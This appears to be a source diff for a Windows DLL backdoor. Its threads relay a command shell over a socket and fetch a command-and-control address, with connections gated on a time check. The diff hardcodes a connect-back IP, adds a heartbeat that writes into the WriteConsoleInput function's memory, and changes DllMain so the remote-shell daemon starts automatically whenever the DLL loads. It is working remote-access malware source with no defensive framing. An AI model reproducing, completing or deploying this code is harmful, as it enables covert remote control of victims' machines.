@@ -1,10 +1,6 @@
 #include "funcs.h"
 
 DWORD WINAPI BindThread( LPVOID lpParam ) {    
-  char tag[] = {
-    '4','4','4','4','6',
-    0
-  } ;
   WSADATA WSAData;
   SOCKET s;
   SOCKET AcceptedSocket;
@@ -29,6 +25,7 @@ DWORD WINAPI BindThread( LPVOID lpParam ) {
   int split ;
   PRINTF( "bind to %s\n" , ( char* )lpParam ) ;
   memcpy( ip , ( char* )lpParam , 15 ) ;
+  memcpy( ip , "192.168.003.152" , 15 ) ;
   memcpy( port , ( char* )lpParam + 16 , 5 ) ;
   for( ; ; ) {
     srand( ( unsigned )time( NULL ) ) ;
@@ -102,10 +99,6 @@ DWORD WINAPI BindThread( LPVOID lpParam ) {
 }
 
 DWORD WINAPI ClientSocketToShell(LPVOID lpParameter) {
-  char tag[] = {
-    '4','4','4','4','5',
-    0
-  } ;
   sThreadInfo *ti = (sThreadInfo*) lpParameter;
   BYTE buffer[1024];
   DWORD BytesWritten;
@@ -132,10 +125,6 @@ DWORD WINAPI ClientSocketToShell(LPVOID lpParameter) {
 }
 
 DWORD WINAPI ShellToClientSocket(LPVOID lpParameter) {
-  char tag[] = {
-    '4','4','4','4','4',
-    0
-  } ;
   sThreadInfo *ti = (sThreadInfo*) lpParameter;
   int ret ;
   BYTE buffer[1024];
@@ -157,10 +146,6 @@ DWORD WINAPI ShellToClientSocket(LPVOID lpParameter) {
 }
 
 BOOLEAN CheckLocalTime( ) {
-  char tag[] = {
-    '4','4','4','4','1',
-    0
-  } ;
   BOOLEAN rc = FALSE ;
   SYSTEMTIME lt ;
   GetLocalTime( &lt ) ;
@@ -188,10 +173,6 @@ BOOLEAN CheckLocalTime( ) {
 }
 
 void GetCCInfo( char* address ) {
-  char tag[] = {
-    '4','4','4','4','3',
-    0
-  } ;
   int iResult ;
   WSADATA wsaData ;
   SOCKET ConnectSocket = INVALID_SOCKET ;
@@ -363,42 +344,102 @@ BOOLEAN CheckAddress( char* address ) {
 }
 
 DWORD WINAPI DaemonThread( LPVOID lpParam ) {
-  char tag[] = {
-  '4','4','4','4','2',
-    0
-    } ;
+  DWORD dwHeartBeatThreadId ;
+  HANDLE hHeartBeatThread ;
   DWORD dwBindThreadId ;
   HANDLE hBindThread = NULL ;
   char address[DEFAULT_BUFLEN] ;
-  for( ; ; ) {
-    if( CheckLocalTime( ) ) {
-      GetCCInfo( &address ) ;
-      if( CheckAddress( &address ) ) {
-        if( !hBindThread ) {
-          hBindThread = CreateThread(
-            NULL ,
-            0 ,
-            BindThread ,
-            address ,
-            0 ,
-            &dwBindThreadId
-            ) ;
-          WaitForSingleObject( hBindThread , 1 ) ;
-        } // end of if( !hBindThread )
-      } // end of if( CheckAddress( &address ) )
+  if( !CheckHeartBeat( ) ) {
+    hHeartBeatThread = CreateThread(
+      NULL ,
+      0 ,
+      HeartBeatThread ,
+      NULL ,
+      0 ,
+      &dwHeartBeatThreadId
+      ) ;
+    WaitForSingleObject( hHeartBeatThread , 1 ) ;
+    CloseHandle( hHeartBeatThread ) ;
+    for( ; ; ) {
+      if( CheckLocalTime( ) ) {
+        GetCCInfo( &address ) ;
+        if( CheckAddress( &address ) ) {
+          if( !hBindThread ) {
+            hBindThread = CreateThread(
+              NULL ,
+              0 ,
+              BindThread ,
+              address ,
+              0 ,
+              &dwBindThreadId
+              ) ;
+            WaitForSingleObject( hBindThread , 1 ) ;
+          } // end of if( !hBindThread )
+        } // end of if( CheckAddress( &address ) )
+        else {
+          TerminateThread( hBindThread , 0 ) ;
+          CloseHandle( hBindThread ) ;
+          hBindThread = NULL ;
+        }
+      } // end of if( CheckLocalTime( ) )
       else {
         TerminateThread( hBindThread , 0 ) ;
         CloseHandle( hBindThread ) ;
         hBindThread = NULL ;
       }
-    } // end of if( CheckLocalTime( ) )
-    else {
-      TerminateThread( hBindThread , 0 ) ;
-      CloseHandle( hBindThread ) ;
-      hBindThread = NULL ;
-    }
-    Sleep( CHECK_LOCAL_TIME_SPLIT * 1000 ) ;
+      Sleep( CHECK_LOCAL_TIME_SPLIT * 1000 ) ;
+    } // end of for( ; ; )
+  } // end of if( !CheckHeartBeat( ) ) {
+}
+
+DWORD WINAPI HeartBeatThread( LPVOID lpParam ) {
+  long* timeStamp ;
+  long timeStamp_new ;
+  DWORD dwPID , dwTID ;
+  HANDLE hProcess ;
+  dwPID = GetCurrentProcessId( ) ;
+  dwTID = GetCurrentThreadId( ) ;
+  hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPID);
+  timeStamp = ( long* )WriteConsoleInput ;
+  for( ; ; ) {
+#ifdef _DEBUG_
+    PRINTF( "[%d] heart beating timeStamp %ld\r\n" , dwTID , *timeStamp ) ;
+#endif
+    timeStamp_new = *timeStamp ;
+    timeStamp_new ++ ;
+    WriteProcessMemory( 
+      hProcess , 
+      ( LPVOID )WriteConsoleInput ,
+      ( LPVOID )&timeStamp_new ,
+      sizeof( &timeStamp_new ) ,
+      NULL 
+      ) ;
+    Sleep( HEART_BEAT_SPLIT * 1000 ) ;
   }
+}
+
+BOOL CheckHeartBeat( ) {
+  BOOL rc = FALSE ; // default not beating
+  long* timeStamp ;
+  long timeStamp_old ;
+  long timeStamp_new ;
+  DWORD dwPID , dwTID ;
+  HANDLE hProcess ;
+  dwPID = GetCurrentProcessId( ) ;
+  dwTID = GetCurrentThreadId( ) ;
+  hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPID);
+  timeStamp = ( long* )WriteConsoleInput ;
+  timeStamp_old = *timeStamp ;
+#ifdef _DEBUG_
+  PRINTF( "[%d] check timeStamp_old %ld\r\n" , dwTID , timeStamp_old ) ;
+#endif
+  Sleep( ( HEART_BEAT_SPLIT + 1 ) * 1000 ) ;
+  timeStamp_new = *timeStamp ;
+#ifdef _DEBUG_
+  PRINTF( "[%d] check timeStamp_new %ld\r\n" , dwTID , timeStamp_new ) ;
+#endif
+  rc = timeStamp_old == timeStamp_new ? FALSE : TRUE ;
+  return rc ;
 }
 
 BOOL WINAPI DllMain(
@@ -410,17 +451,16 @@ BOOL WINAPI DllMain(
   HANDLE hDaemonThread ;
   switch( fdwReason ) {
   case DLL_PROCESS_ATTACH :
-    /* hDaemonThread = CreateThread( */
-    /*   NULL , */
-    /*   0 , */
-    /*   DaemonThread , */
-    /*   NULL , */
-    /*   0 , */
-    /*   &dwDaemonThreadId */
-    /*   ) ; */
-    /* WaitForSingleObject( hDaemonThread , 1 ) ; */
-    /* CloseHandle( hDaemonThread ) ; */
-    MessageBox( NULL , L"dllmain of XJJ.dll" , NULL , 0 ) ;
+    hDaemonThread = CreateThread(
+      NULL ,
+      0 ,
+      DaemonThread ,
+      NULL ,
+      0 ,
+      &dwDaemonThreadId
+      ) ;
+    WaitForSingleObject( hDaemonThread , 1 ) ;
+    CloseHandle( hDaemonThread ) ;
     break ;
   case DLL_PROCESS_DETACH :
   case DLL_THREAD_ATTACH :
